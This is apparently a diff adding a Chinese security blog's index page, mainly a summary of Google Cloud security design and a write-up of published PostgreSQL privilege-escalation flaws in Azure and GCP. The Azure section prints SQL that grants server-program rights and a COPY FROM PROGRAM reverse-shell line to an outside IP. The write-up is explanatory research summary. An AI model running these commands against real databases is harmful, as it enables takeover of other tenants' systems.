+•    在系统管理员工作流程中创建冗余和批准以加强问责制。
+•    使用精细配置的权限并仅将敏感数据的访问权限授予有相应工作职能需要的员工。
+•    使用日志记录提高组织中数据访问和移动的透明度。
+•    使用联网规则、identity and access management (IAM) 以及堡垒主机限制和监控组织中的机器的入站和出站。
+•    创建数据流的正常基准（例如可访问或传输的数据量）和用于比较异常行为的访问的地理位置。
+</code></pre>
+<h2 id="五、安全的互联网通信"><a href="#五、安全的互联网通信" class="headerlink" title="五、安全的互联网通信"></a>五、安全的互联网通信</h2><p>服务间通信的安全性不依赖于网络安全。但是，将基础架构从互联网隔离到专用 IP 地址空间。只将部分机器直接暴露给外部互联网流量，从而可以实现额外的保护，例如防御拒绝服务 (DoS) 攻击。</p>
+<h3 id="1-Google-Front-End-服务"><a href="#1-Google-Front-End-服务" class="headerlink" title="1. Google Front End 服务"></a>1. Google Front End 服务</h3><p>当某个服务需要在互联网上可用时，它可向名为 Google Front End (GFE) 的基础架构服务注册。</p>
+<h3 id="2-DoS防护"><a href="#2-DoS防护" class="headerlink" title="2. DoS防护"></a>2. DoS防护</h3><p>当光纤骨干网向其中一个数据中心传送外部连接时，该连接会经过多层硬件和软件负载均衡器。这些负载均衡器会将有关入站流量的信息报告给在基础架构上运行的中央 DoS 服务。当中央 DoS 服务检测到 DoS 攻击时，该服务可以配置负载均衡器，以降低或限制与攻击相关的流量。</p>
+<h3 id="3-用户身份验证"><a href="#3-用户身份验证" class="headerlink" title="3. 用户身份验证"></a>3. 用户身份验证</h3><p>在 DoS 防护之后，安全通信的下一层防御来自中央身份识别服务。</p>
+<p>用户登录时，他们可以使用第二重身份验证，例如动态密码或防钓鱼安全密钥（例如 Titan 安全密钥）。</p>
+<p>相关技术细节参考：<br><a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/authentication?hl=zh-cn">https://cloud.google.com/docs/authentication?hl=zh-cn<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/authentication/use-cases?hl=zh-cn">https://cloud.google.com/docs/authentication/use-cases?hl=zh-cn<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="六、安全运营"><a href="#六、安全运营" class="headerlink" title="六、安全运营"></a>六、安全运营</h2><h3 id="1-安全的软件开发"><a href="#1-安全的软件开发" class="headerlink" title="1.安全的软件开发"></a>1.安全的软件开发</h3><p>源代码控制保护机制和双方审核流程<br>安全库和安全框架<br>自动化安全扫描工具<br>人工安全审核<br>漏洞奖励计划<br>安全问题研究(P0)</p>
+<h3 id="2-源代码保护"><a href="#2-源代码保护" class="headerlink" title="2.源代码保护"></a>2.源代码保护</h3><p>源代码存储在具有内置源完整性和治理的代码库中，可以在其中审核服务的当前版本和过去版本。</p>
+<p>基础架构要求服务的二进制文件基于经过审核、登记和测试的特定源代码构建。</p>
+<p>Binary Authorization for Borg (BAB) 是部署服务时进行的内部强制执行检查。供应链完整性可确保处理数据的服务的底层代码和二进制文件得到验证，并且通过证明测试。</p>
+<pre><code>•    确保 Google 上部署的生产软件和配置经过审核和授权，尤其是在代码可以访问用户数据时。
+•    确保代码和配置部署满足特定的最低标准。
+•    防止内部人员或攻击者恶意修改源代码，并实现从服务回溯到其源代码的取证跟踪。
+</code></pre>
+<p>实现细节参看：<a class="link" target="_blank" rel="noopener" href="https://cloud.google.com/docs/security/binary-authorization-for-borg?hl=zh-cn">https://cloud.google.com/docs/security/binary-authorization-for-borg?hl=zh-cn<i class="fas fa-external-link-alt"></i></a></p>
+<p>如果怀疑任何凭据已遭到泄露，必须立即采取措施来限制其 Google Cloud 帐号的影响。确保用户的SOC 拥有快速响应可疑凭据泄露事件所需的策略方案、工具和访问权限。</p>
+<p>将您的凭据与源代码分开管理和存储。不小心将凭据和源代码都推送到 GitHub 等源代码管理站点这种情况极其常见，这会使您的凭据容易遭到攻击。使用 Secret Manager 和 Hashicorp Vault 等密文管理解决方案来存储密文，定期进行轮替，并应用最小权限。</p>
+<h3 id="3-确保员工设备及凭据的安全"><a href="#3-确保员工设备及凭据的安全" class="headerlink" title="3.确保员工设备及凭据的安全"></a>3.确保员工设备及凭据的安全</h3><p>实施保护措施，使员工的设备和凭据免遭破解。强制使用与 U2F 兼容的安全密钥来取代动态密码双重身份验证。</p>
+<p>监控员工用于运行基础架构的客户端设备。</p>
+<p>使用零信任安全性来保护员工对资源的访问。</p>
+<h3 id="4-降低来自内部人员的风险"><a href="#4-降低来自内部人员的风险" class="headerlink" title="4. 降低来自内部人员的风险"></a>4. 降低来自内部人员的风险</h3><p>限制并主动监控拥有基础架构管理员权限的员工的活动。</p>
+<p>Google 员工对最终用户信息的访问情况可通过底层基础架构钩子进行记录。安全团队会监控访问模式并调查异常事件。</p>
+<h3 id="5-威胁监控"><a href="#5-威胁监控" class="headerlink" title="5.威胁监控"></a>5.威胁监控</h3><p>Google 的威胁分析小组会监控威胁发起者及其策略和技术的演变。</p>
+<h3 id="6-入侵检测"><a href="#6-入侵检测" class="headerlink" title="6.入侵检测"></a>6.入侵检测</h3><p>使用复杂的数据处理流水线来集成各个设备上基于主机的信号、来自基础架构中各个监控点的基于网络的信号，以及来自基础架构服务的信号。构建于这些流水线之上的规则和机器智能会向运营安全工程师发出潜在突发事件警告。</p>
+<h3 id="7-应急响应"><a href="#7-应急响应" class="headerlink" title="7.应急响应"></a>7.应急响应</h3><p>每个数据突发事件都具有特异性，数据突发事件响应流程的目标是保护客户的数据，尽快恢复正常服务，并满足监管和合同合规要求。 Google 的突发事件响应计划的流程如下：</p>
+<p><img lazyload src="/images/loading.svg" data-src="13.png"></p>
+<h2 id="七、支持合规性要求"><a href="#七、支持合规性要求" class="headerlink" title="七、支持合规性要求"></a>七、支持合规性要求</h2><p>Google Cloud 会定期接受安全性、隐私权和合规控制措施方面的独立验证，并接收认证、证明和审核报告以证明合规。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Oct 12 2022 21:00:00 GMT+0800">2022-10-12</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/Cloud/">Cloud</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Google%E4%BA%91%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E5%AD%A6%E4%B9%A0/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Cloud%20Native%20PostgreSQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/">
+                        Cloud Native PostgreSQL攻击面分析
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+本文以Azure为例，简单叙述下在学习云环境下PostgreSQL的过程和几个有趣漏洞
+
+
+一、Azure PostgreSQL基本情况和攻击面分析1. Azure PostgreSQL基本情况侦查
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ERROR:  permission denied for function lo_export
+ERROR:  permission denied for table pg_largeobject
+
+插件列表
+1234567891011121314&quot;xml2&quot;&quot;1.1&quot;&quot;XPath querying and XSLT&quot;&quot;citext&quot;&quot;1.6&quot;&quot;data type for case-insensitive character strings&quot;&quot;file_fdw&quot;&quot;1.0&quot;&quot;foreign-data wrapper for flat file access&quot;&quot;postgis_sfcgal&quot;&quot;3.2.0&quot;&quot;PostGIS SFCGAL functions&quot;&quot;pg_qs&quot;&quot;2.2&quot;&quot;Query Store&quot;&quot;pg_prewarm&quot;&quot;1.2&quot;&quot;prewarm relation data&quot;&quot;insert_username&quot;&quot;1.0&quot;&quot;functions for tracking who changed a table&quot;&quot;amcheck&quot;&quot;1.3&quot;&quot;functions for verifying relation integrity&quot;&quot;sslinfo&quot;&quot;1.2&quot;&quot;information about SSL certificates&quot;&quot;pglogical_origin&quot;&quot;1.0.0&quot;&quot;Dummy extension for compatibility when upgrading from Postgres 9.4&quot;&quot;intarray&quot;&quot;1.5&quot;&quot;functions, operators, and index support for 1-D arrays of integers&quot;&quot;bloom&quot;&quot;1.0&quot;&quot;bloom access method - signature file based index&quot;&quot;postgis_topology&quot;&quot;3.2.0&quot;&quot;PostGIS topology spatial types and functions&quot;省略.......
+
+
+2. 攻击面分析可以将攻击面分成三类，分别是PostgreSQL自身漏洞、PostgreSQL功能特性漏洞、PostgreSQL二次开发漏洞。
+PostgreSQL自身漏洞1 参考官方漏洞列表，利用较多的为CVE-2020-25695、CVE-2019-9193等
+
+PostgreSQL功能特性导致漏洞1 高危函数限制不严格，例如上文中提到的这些；
+
+2 用户角色/权限设计不合理，例如不加限制的授予用户CREATEROLE权限等
+
+PostgreSQL二次开发导致漏洞1 在云上，CSP需要允许用户某些功能，但是要限制其不安全的操作，这就需要对权限模型进行二次开发，可能造成漏洞；
+
+2 不安全的API也是云上最大的风险之一，注入、糟糕的访问控制等
+
+二、有趣漏洞1. Azure Database for PostgreSQL漏洞1Step1. Azure二次开发PostgreSQL，以强化其特权模型并添加新功能，通过寻找二次开发的导致的漏洞，将普通账号提升至特权账号superuser，进而实现命令执行获得宿主容器权限；Step2. 在服务的内部网络中执行侦察，发现可以通过网络访问子网中的其他客户实例；Step3. 进一步侦查发现，PostgreSQL 提供了一项独特的功能，允许将数据库数据从一台服务器复制到另一台服务器，从而“复制”数据库。这通常用于备份和故障转移/高可用性方案；Step4. 从 Certificate Transparency 提要中检索目标的公用名；Step5. 从 DigiCert 或 DigiCert 中间证书颁发机构购买特制证书；Step6. 通过解析数据库域名并将其与 Azure 的公共 IP 范围之一匹配来查找目标的 Azure 区域；Step7. 扫描目标实例的子网并利用漏洞获得读取权限。
+2. Azure Database for PostgreSQL漏洞2Step1. Azure 对 PostgreSQL 引擎进行了一些修改，以便在云中提供 PostgreSQL 即服务；Step2. Azure PostgreSQL 授予用户CREATEROLE权限，但没有限制角色以防止其被滥用；Step3.1234CREATE USER james CREATEDB IN GROUP pg_read_server_files,pg_write_server_files,pg_execute_server_program ROLE postgres;
+
+Step4.123SET ROLE “james”;COPY shell_results FROM program &#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/13.33.33.7/1337 0&gt;&amp;1&quot;&#x27;;Step5. 
+
+
+3. GCP Database for PostgreSQL漏洞1Step1. GCP 对引擎引入的一项修改允许cloudsqlsuperuser角色将表的所有权任意更改为数据库中的任何用户或角色;Step2. 发现对表执行上述任何命令都会隐式调用具有表所有者权限的索引函数;Step3.12345创建一个新表。向表中插入一些虚拟内容，以便索引函数可以使用。在表上创建一个恶意索引函数（使用我们的代码执行负载）。将表所有者更改为 cloudsqladmin ，即 GCP 的超级用户角色，仅供 Cloud SQL 用于维护和管理数据库。ANALYZE table，强制 PostgreSQL 引擎将 user-context 切换到 table 的所有者（ cloudsqladmin ）并以 cloudsqladmin 权限调用恶意索引函数，导致执行我们之前没有权限执行的 shell 命令。
+
+Step4. 权限提升（非常牛逼，建议看原文）参考：
+http://tttang.com/archive/1547/
+https://www.postgresql.org/about/newsarchive/security/
+https://www.wiz.io/blog/wiz-research-discovers-extrareplica-cross-account-database-vulnerability-in-azure-postgresql
+https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities
+https://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc/
+https://www.postgresql.org/support/security/ 
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <blockquote>
+<blockquote>
+<p>本文以Azure为例，简单叙述下在学习云环境下PostgreSQL的过程和几个有趣漏洞</p>
+</blockquote>
+</blockquote>
+<h2 id="一、Azure-PostgreSQL基本情况和攻击面分析"><a href="#一、Azure-PostgreSQL基本情况和攻击面分析" class="headerlink" title="一、Azure PostgreSQL基本情况和攻击面分析"></a>一、Azure PostgreSQL基本情况和攻击面分析</h2><h3 id="1-Azure-PostgreSQL基本情况侦查"><a href="#1-Azure-PostgreSQL基本情况侦查" class="headerlink" title="1. Azure PostgreSQL基本情况侦查"></a>1. Azure PostgreSQL基本情况侦查</h3><p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="6.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="7.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="10.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="11.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="12.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="13.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="14.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="15.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="16.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="17.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="18.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="19.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="20.png"></p>
+<p>ERROR:  permission denied for function lo_export</p>
+<p>ERROR:  permission denied for table pg_largeobject</p>
+<p><img lazyload src="/images/loading.svg" data-src="8.png"></p>
+<p>插件列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;xml2&quot;&quot;1.1&quot;&quot;XPath querying and XSLT&quot;</span><br><span class="line">&quot;citext&quot;&quot;1.6&quot;&quot;data type for case-insensitive character strings&quot;</span><br><span class="line">&quot;file_fdw&quot;&quot;1.0&quot;&quot;foreign-data wrapper for flat file access&quot;</span><br><span class="line">&quot;postgis_sfcgal&quot;&quot;3.2.0&quot;&quot;PostGIS SFCGAL functions&quot;</span><br><span class="line">&quot;pg_qs&quot;&quot;2.2&quot;&quot;Query Store&quot;</span><br><span class="line">&quot;pg_prewarm&quot;&quot;1.2&quot;&quot;prewarm relation data&quot;</span><br><span class="line">&quot;insert_username&quot;&quot;1.0&quot;&quot;functions for tracking who changed a table&quot;</span><br><span class="line">&quot;amcheck&quot;&quot;1.3&quot;&quot;functions for verifying relation integrity&quot;</span><br><span class="line">&quot;sslinfo&quot;&quot;1.2&quot;&quot;information about SSL certificates&quot;</span><br><span class="line">&quot;pglogical_origin&quot;&quot;1.0.0&quot;&quot;Dummy extension for compatibility when upgrading from Postgres 9.4&quot;</span><br><span class="line">&quot;intarray&quot;&quot;1.5&quot;&quot;functions, operators, and index support for 1-D arrays of integers&quot;</span><br><span class="line">&quot;bloom&quot;&quot;1.0&quot;&quot;bloom access method - signature file based index&quot;</span><br><span class="line">&quot;postgis_topology&quot;&quot;3.2.0&quot;&quot;PostGIS topology spatial types and functions&quot;</span><br><span class="line">省略.......</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="2-攻击面分析"><a href="#2-攻击面分析" class="headerlink" title="2. 攻击面分析"></a>2. 攻击面分析</h3><p>可以将攻击面分成三类，分别是PostgreSQL自身漏洞、PostgreSQL功能特性漏洞、PostgreSQL二次开发漏洞。</p>
+<h4 id="PostgreSQL自身漏洞"><a href="#PostgreSQL自身漏洞" class="headerlink" title="PostgreSQL自身漏洞"></a>PostgreSQL自身漏洞</h4><pre><code>1 参考官方漏洞列表，利用较多的为CVE-2020-25695、CVE-2019-9193等
+</code></pre>
+<h4 id="PostgreSQL功能特性导致漏洞"><a href="#PostgreSQL功能特性导致漏洞" class="headerlink" title="PostgreSQL功能特性导致漏洞"></a>PostgreSQL功能特性导致漏洞</h4><pre><code>1 高危函数限制不严格，例如上文中提到的这些；
+
+2 用户角色/权限设计不合理，例如不加限制的授予用户CREATEROLE权限等
+</code></pre>
+<h4 id="PostgreSQL二次开发导致漏洞"><a href="#PostgreSQL二次开发导致漏洞" class="headerlink" title="PostgreSQL二次开发导致漏洞"></a>PostgreSQL二次开发导致漏洞</h4><pre><code>1 在云上，CSP需要允许用户某些功能，但是要限制其不安全的操作，这就需要对权限模型进行二次开发，可能造成漏洞；
+
+2 不安全的API也是云上最大的风险之一，注入、糟糕的访问控制等
+</code></pre>
+<h2 id="二、有趣漏洞"><a href="#二、有趣漏洞" class="headerlink" title="二、有趣漏洞"></a>二、有趣漏洞</h2><h3 id="1-Azure-Database-for-PostgreSQL漏洞1"><a href="#1-Azure-Database-for-PostgreSQL漏洞1" class="headerlink" title="1. Azure Database for PostgreSQL漏洞1"></a>1. Azure Database for PostgreSQL漏洞1</h3><h4 id="Step1-Azure二次开发PostgreSQL，以强化其特权模型并添加新功能，通过寻找二次开发的导致的漏洞，将普通账号提升至特权账号superuser，进而实现命令执行获得宿主容器权限；"><a href="#Step1-Azure二次开发PostgreSQL，以强化其特权模型并添加新功能，通过寻找二次开发的导致的漏洞，将普通账号提升至特权账号superuser，进而实现命令执行获得宿主容器权限；" class="headerlink" title="Step1. Azure二次开发PostgreSQL，以强化其特权模型并添加新功能，通过寻找二次开发的导致的漏洞，将普通账号提升至特权账号superuser，进而实现命令执行获得宿主容器权限；"></a>Step1. Azure二次开发PostgreSQL，以强化其特权模型并添加新功能，通过寻找二次开发的导致的漏洞，将普通账号提升至特权账号superuser，进而实现命令执行获得宿主容器权限；</h4><h4 id="Step2-在服务的内部网络中执行侦察，发现可以通过网络访问子网中的其他客户实例；"><a href="#Step2-在服务的内部网络中执行侦察，发现可以通过网络访问子网中的其他客户实例；" class="headerlink" title="Step2. 在服务的内部网络中执行侦察，发现可以通过网络访问子网中的其他客户实例；"></a>Step2. 在服务的内部网络中执行侦察，发现可以通过网络访问子网中的其他客户实例；</h4><h4 id="Step3-进一步侦查发现，PostgreSQL-提供了一项独特的功能，允许将数据库数据从一台服务器复制到另一台服务器，从而“复制”数据库。这通常用于备份和故障转移-高可用性方案；"><a href="#Step3-进一步侦查发现，PostgreSQL-提供了一项独特的功能，允许将数据库数据从一台服务器复制到另一台服务器，从而“复制”数据库。这通常用于备份和故障转移-高可用性方案；" class="headerlink" title="Step3. 进一步侦查发现，PostgreSQL 提供了一项独特的功能，允许将数据库数据从一台服务器复制到另一台服务器，从而“复制”数据库。这通常用于备份和故障转移/高可用性方案；"></a>Step3. 进一步侦查发现，PostgreSQL 提供了一项独特的功能，允许将数据库数据从一台服务器复制到另一台服务器，从而“复制”数据库。这通常用于备份和故障转移/高可用性方案；</h4><h4 id="Step4-从-Certificate-Transparency-提要中检索目标的公用名；"><a href="#Step4-从-Certificate-Transparency-提要中检索目标的公用名；" class="headerlink" title="Step4. 从 Certificate Transparency 提要中检索目标的公用名；"></a>Step4. 从 Certificate Transparency 提要中检索目标的公用名；</h4><h4 id="Step5-从-DigiCert-或-DigiCert-中间证书颁发机构购买特制证书；"><a href="#Step5-从-DigiCert-或-DigiCert-中间证书颁发机构购买特制证书；" class="headerlink" title="Step5. 从 DigiCert 或 DigiCert 中间证书颁发机构购买特制证书；"></a>Step5. 从 DigiCert 或 DigiCert 中间证书颁发机构购买特制证书；</h4><h4 id="Step6-通过解析数据库域名并将其与-Azure-的公共-IP-范围之一匹配来查找目标的-Azure-区域；"><a href="#Step6-通过解析数据库域名并将其与-Azure-的公共-IP-范围之一匹配来查找目标的-Azure-区域；" class="headerlink" title="Step6. 通过解析数据库域名并将其与 Azure 的公共 IP 范围之一匹配来查找目标的 Azure 区域；"></a>Step6. 通过解析数据库域名并将其与 Azure 的公共 IP 范围之一匹配来查找目标的 Azure 区域；</h4><h4 id="Step7-扫描目标实例的子网并利用漏洞获得读取权限。"><a href="#Step7-扫描目标实例的子网并利用漏洞获得读取权限。" class="headerlink" title="Step7. 扫描目标实例的子网并利用漏洞获得读取权限。"></a>Step7. 扫描目标实例的子网并利用漏洞获得读取权限。</h4><p><img lazyload src="/images/loading.svg" data-src="21.png"></p>
+<h3 id="2-Azure-Database-for-PostgreSQL漏洞2"><a href="#2-Azure-Database-for-PostgreSQL漏洞2" class="headerlink" title="2. Azure Database for PostgreSQL漏洞2"></a>2. Azure Database for PostgreSQL漏洞2</h3><h4 id="Step1-Azure-对-PostgreSQL-引擎进行了一些修改，以便在云中提供-PostgreSQL-即服务；"><a href="#Step1-Azure-对-PostgreSQL-引擎进行了一些修改，以便在云中提供-PostgreSQL-即服务；" class="headerlink" title="Step1. Azure 对 PostgreSQL 引擎进行了一些修改，以便在云中提供 PostgreSQL 即服务；"></a>Step1. Azure 对 PostgreSQL 引擎进行了一些修改，以便在云中提供 PostgreSQL 即服务；</h4><h4 id="Step2-Azure-PostgreSQL-授予用户CREATEROLE权限，但没有限制角色以防止其被滥用；"><a href="#Step2-Azure-PostgreSQL-授予用户CREATEROLE权限，但没有限制角色以防止其被滥用；" class="headerlink" title="Step2. Azure PostgreSQL 授予用户CREATEROLE权限，但没有限制角色以防止其被滥用；"></a>Step2. Azure PostgreSQL 授予用户CREATEROLE权限，但没有限制角色以防止其被滥用；</h4><h4 id="Step3"><a href="#Step3" class="headerlink" title="Step3."></a>Step3.</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER james CREATEDB IN GROUP </span><br><span class="line">pg_read_server_files,</span><br><span class="line">pg_write_server_files,</span><br><span class="line">pg_execute_server_program ROLE postgres;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step4"><a href="#Step4" class="headerlink" title="Step4."></a>Step4.</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET ROLE “james”;</span><br><span class="line">COPY shell_results FROM program &#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/13.33.33.7/1337 0&gt;&amp;1&quot;&#x27;;</span><br><span class="line">Step5. </span><br></pre></td></tr></table></figure>
+
+<p><img lazyload src="/images/loading.svg" data-src="22.png"></p>
+<h3 id="3-GCP-Database-for-PostgreSQL漏洞1"><a href="#3-GCP-Database-for-PostgreSQL漏洞1" class="headerlink" title="3. GCP Database for PostgreSQL漏洞1"></a>3. GCP Database for PostgreSQL漏洞1</h3><h4 id="Step1-GCP-对引擎引入的一项修改允许cloudsqlsuperuser角色将表的所有权任意更改为数据库中的任何用户或角色"><a href="#Step1-GCP-对引擎引入的一项修改允许cloudsqlsuperuser角色将表的所有权任意更改为数据库中的任何用户或角色" class="headerlink" title="Step1. GCP 对引擎引入的一项修改允许cloudsqlsuperuser角色将表的所有权任意更改为数据库中的任何用户或角色;"></a>Step1. GCP 对引擎引入的一项修改允许cloudsqlsuperuser角色将表的所有权任意更改为数据库中的任何用户或角色;</h4><h4 id="Step2-发现对表执行上述任何命令都会隐式调用具有表所有者权限的索引函数"><a href="#Step2-发现对表执行上述任何命令都会隐式调用具有表所有者权限的索引函数" class="headerlink" title="Step2. 发现对表执行上述任何命令都会隐式调用具有表所有者权限的索引函数;"></a>Step2. 发现对表执行上述任何命令都会隐式调用具有表所有者权限的索引函数;</h4><h4 id="Step3-1"><a href="#Step3-1" class="headerlink" title="Step3."></a>Step3.</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建一个新表。</span><br><span class="line">向表中插入一些虚拟内容，以便索引函数可以使用。</span><br><span class="line">在表上创建一个恶意索引函数（使用我们的代码执行负载）。</span><br><span class="line">将表所有者更改为 cloudsqladmin ，即 GCP 的超级用户角色，仅供 Cloud SQL 用于维护和管理数据库。</span><br><span class="line">ANALYZE table，强制 PostgreSQL 引擎将 user-context 切换到 table 的所有者（ cloudsqladmin ）并以 cloudsqladmin 权限调用恶意索引函数，导致执行我们之前没有权限执行的 shell 命令。</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step4-权限提升（非常牛逼，建议看原文）"><a href="#Step4-权限提升（非常牛逼，建议看原文）" class="headerlink" title="Step4. 权限提升（非常牛逼，建议看原文）"></a>Step4. 权限提升（非常牛逼，建议看原文）</h4><p>参考：</p>
+<p><a class="link" target="_blank" rel="noopener" href="http://tttang.com/archive/1547/">http://tttang.com/archive/1547/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.postgresql.org/about/newsarchive/security/">https://www.postgresql.org/about/newsarchive/security/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.wiz.io/blog/wiz-research-discovers-extrareplica-cross-account-database-vulnerability-in-azure-postgresql">https://www.wiz.io/blog/wiz-research-discovers-extrareplica-cross-account-database-vulnerability-in-azure-postgresql<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities">https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc/">https://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.postgresql.org/support/security/">https://www.postgresql.org/support/security/<i class="fas fa-external-link-alt"></i></a> </p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue Sep 20 2022 21:00:00 GMT+0800">2022-09-20</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/Cloud/">Cloud</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Cloud%20Native%20PostgreSQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E5%A6%84%E8%B0%88%EF%BC%9A%E2%80%9C%E6%8A%80%E6%9C%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E2%80%9D%E7%9A%84%E6%9C%AA%E6%9D%A5%E6%98%AF%E2%80%9C%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E5%B8%88%E2%80%9D/">
+                        妄谈：“技术安全运营”的未来是“安全架构师”
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+资历尚浅，见识狭隘，仅以自身所见所闻所学，妄谈一下这个话题，当个乐子，随便看看。
+
+
+问：“架构师”是岗位还是思想？：在阿里对架构师的定义是“去应对复杂性，应对熵值不断增加的一个组织性的力量。”“软件/系统架构的核心挑战是快速增长的复杂性，越是大型系统，越需要简单性。”识别和控制复杂度正式“架构师”在对复杂核心系统设计时候要考虑的重点。
+而架构的基本出发点是效率，通过合理的架构设计、有序化重构，实现效率最大化。
+架构师不应该脱离业务上下文而单独存在，好的架构师是为解决复杂问题而存在的，思考如何能用抽象的方法解决一类问题。将发现的问题进行抽象和归纳，定义问题的基本要素，定义出问题的短期和长期解决方案，推动技术整体的进步。
+简化一下架构师本质上是一种“发现问题—定义问题—解决问题”的能力或是思考模式，而如何定义问题是“架构师”是否优秀的核心衡量。
+问：“架构师”需要具备哪些能力？：“架构师”要具备的五个能力，1. 全局视角 2. 技术广度 3. 持续学习 4. 业务理解 5.结果落地。
+不同level的架构师的差别在于建设的范围，例如在阿里体系内，技术序列从P8开始就要具备架构师的能力，P8往往只负责一个单体业务，P9会负责一个更加复杂的单体业务，到了P10就要思考整个行业，而P11及以上就要跨行业、从集团整体角度去思考问题，最牛的架构师莫过于“1979年，那是一个春天，有一位老人，在中国的南海边，划了一个圈……”
+但是我更认可的是“架构师”是一个底层的人才特质，与层级无关。（实际上有大把P8并没有任何的“架构师”思维）
+问：“架构师”需要非常精深的技术能力吗？：如果身兼“架构师”的角色，往往就没有足够的时间去持续的精深技术，但是这个角色本身需要大量的实践和知识的积累，需要接触更多的人和事，用新的方法来解决新的问题。要具备这个能力，就要持续的保持先进技术学习的能力和经常性的实践。
